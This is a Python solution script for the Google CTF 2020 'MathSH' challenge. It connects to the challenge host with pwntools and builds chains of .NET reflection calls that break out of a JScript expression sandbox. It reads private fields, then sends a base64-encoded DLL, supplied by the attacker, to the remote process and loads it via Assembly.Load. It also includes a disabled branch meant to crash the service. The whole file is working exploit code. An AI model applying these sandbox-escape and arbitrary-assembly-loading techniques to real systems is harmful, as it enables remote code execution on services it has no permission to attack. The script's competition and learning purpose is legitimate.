import pwn
import sys

from mathsh_utils import *

HOST = "mathsh.2020.ctfcompetition.com"
# HOST = "localhost"


fname = sys.argv[1]
dll = file(fname, 'rb').read()
dll_base64 = dll.encode("base64").replace("\n", "").replace("\r", "")

remote = pwn.remote(HOST, 1337)
print remote.recvuntil("MathSH> ")

remote.sendline("__init__(true)")
remote.recvuntil("MathSH> ")


WriteException = GetMethod(JScriptGlobalType, "WriteException", False, True, True, MakeArray(ExceptionObj))

MethodInfo_invoke1 = GetMethod(MethodInfoType, "Invoke", False, True, False, MakeArray(Object, MakeArray()))

ConstructorInfo_invoke = GetMethod(ConstructorInfoType, "Invoke", False, True, False, MakeArray(MakeArray()))

LoadModule = GetMethod(RuntimeAssemblyType, "LoadModule", False, True, False, MakeArray(String, MakeArray(), MakeArray()))

RuntimeAssembly_methods = CallMethodImpl(GetMethods, RuntimeAssemblyType, GetFlags(True, True, True))
Assembly_methods = CallMethodImpl(GetMethods, AssemblyType, GetFlags(True, True, False))

nLoadImage = ArrayGetValue(RuntimeAssembly_methods, 62)
nLoadImageParamInfo = CallMethodSecure(nLoadImage, "GetParameters")
JScriptUtils_Type = FindType("JScriptRunner.JScriptUtils")

GetField_method = GetMethod(Type, "GetField", False, True, False, MakeArray(convert_arg("asdf"), GetFlags(True, True, True)))

set_lease_field = CallMethodImpl(GetField_method, EntryPointType, convert_arg("_set_lease"), GetFlags(True, True, True))

ex_stack_trace_field = CallMethodImpl(GetField_method, ExceptionType, convert_arg("_stackTrace"), GetFlags(False, True, True))
ex_message_field = CallMethodImpl(GetField_method, ExceptionType, convert_arg("_message"), GetFlags(False, True, True))
ex_s_EDILock_field = CallMethodImpl(GetField_method, ExceptionType, convert_arg("s_EDILock"), GetFlags(True, True, True))
ex_dynamicMethods_field = CallMethodImpl(GetField_method, ExceptionType, convert_arg("_dynamicMethods"), GetFlags(False, True, True))
ex_watsonBuckets_field = CallMethodImpl(GetField_method, ExceptionType, convert_arg("_watsonBuckets"), GetFlags(False, True, True))
ex_stackTraceString_field = CallMethodImpl(GetField_method, ExceptionType, convert_arg("_stackTraceString"), GetFlags(False, True, True))


resolver_funcs_field = CallMethodImpl(GetField_method, ExpressionResolverType, convert_arg("_funcs"), GetFlags(False, True, True))

TimeSpanType = FindType("System.TimeSpan")
FromDays = GetMethod(TimeSpanType, "FromDays", True, True, False, MakeArray(1.0))

GetProperty = GetMethod(Type, "GetProperty", False, True, False, MakeArray(convert_arg("sdf"), GetFlags(True, True, True)))
MethodHandleProp = CallMethodImpl(GetProperty, MethodInfoType, convert_arg("MethodHandle"), GetFlags(False, True, False))
ValueProp = CallMethodImpl(GetProperty, RuntimeMethodHandleType, convert_arg("Value"), GetFlags(False, True, False))

GlobalShellProp = CallMethodImpl(GetProperty, JScriptGlobalType, convert_arg("Shell"), GetFlags(False, True, True))

global_shell_field = CallMethodImpl(GetProperty, JScriptGlobalType, convert_arg("Shell"), GetFlags(False, True, True))

PropGetValue = GetMethod(PropertyInfoType, "GetValue", False, True, False, MakeArray(Object, MakeArray()))
FieldSetValue = GetMethod(FieldInfoType, "SetValue", False, True, False, MakeArray(Object, Object))
FieldSetValueEx = GetMethod(FieldInfoType, "SetValue", False, True, False, MakeArray(Object, Object, GetFlags(True, True, True), DefaultBinder, CurrentCulture))

FromDays_RuntimeMethodHandle = CallMethodSecure(MethodHandleProp, "GetValue", MakeArray(FromDays, MakeArray()))

ExpressionResolverCtor = ArrayGetValue(GetConstructors(ExpressionResolverType), 0)

MyShell = CallMethodSecure(GlobalShellProp, "GetValue", 'this')

ObjGetType = GetMethod(Object, "GetType", False, True, False, MakeArray())
StreamShellType = CallMethodImpl(ObjGetType, MyShell)

LifetimeServicesType = FindType('System.Runtime.Remoting.Lifetime.LifetimeServices')
s_LifetimeSyncObject_field = CallMethodImpl(GetField_method, LifetimeServicesType, convert_arg("s_LifetimeSyncObject"), GetFlags(True, True, True))

SS_writer_field = CallMethodImpl(GetField_method, StreamShellType, convert_arg("_writer"), GetFlags(False, True, True))

if HOST == "mathsh.2020.ctfcompetition.com":
    Assembly_Load_3params = ArrayGetValue(Assembly_methods, 20)
else:
    Assembly_Load_3params = ArrayGetValue(Assembly_methods, 19)

SetLeaseTime = GetMethod(EntryPointType, "SetLeaseTime", True, True, True, MakeArray())

LoadMyAssembly = CallMethodSecure(JScriptUtils_Type, "CallMethod", MethodInfo_invoke1, Assembly_Load_3params, MakeArray(AssemblyType, MakeArray(
    Base64Decode(dll_base64), null, 0
)))

MyLoadedAssembly = ArrayGetValue(GetAssemblies(), ArrayGetLength(GetAssemblies()) + ' - 1')

FileLoadException = CallMethodSecure(MyLoadedAssembly, "CreateInstance", convert_arg("FileLoadException.FileLoadException"))

GoogleCTF2020 = CallMethodSecure(AssemblyType, "LoadFrom", convert_arg("c:\\\\ctf\\\\challenge\\\\GoogleCTF2020.exe"))

MyLoadedAssembly = ArrayGetValue(GetAssemblies(), ArrayGetLength(GetAssemblies()) + ' - 1')

StreamShellType = FindType("GoogleCTF2020.StreamShell")
ProgramType = FindType("GoogleCTF2020.Program")
Main = GetMethod(ProgramType, "Main", True, True, True, MakeArray(CallMethod('"a.s.d.f"', "Split", CallMethod('"."', "ToCharArray"))))
SS_writer_field = CallMethodImpl(GetField_method, StreamShellType, convert_arg("_writer"), GetFlags(False, True, True))

remote.sendline(LoadMyAssembly)

# line = CallMethodSecure(MyShell, "WriteLine", convert_arg("Hello World!"))
# remote.sendline(line)


CRASH = False
if CRASH:
    line = CallMethodSecure(FileLoadException, "GetSpecialClass")
    remote.sendline(line)

    line = '__global__.System.GC.Collect()'
    remote.sendline(line)

# remote.interactive()

remote.sendline("exit()")
print remote.recvall()
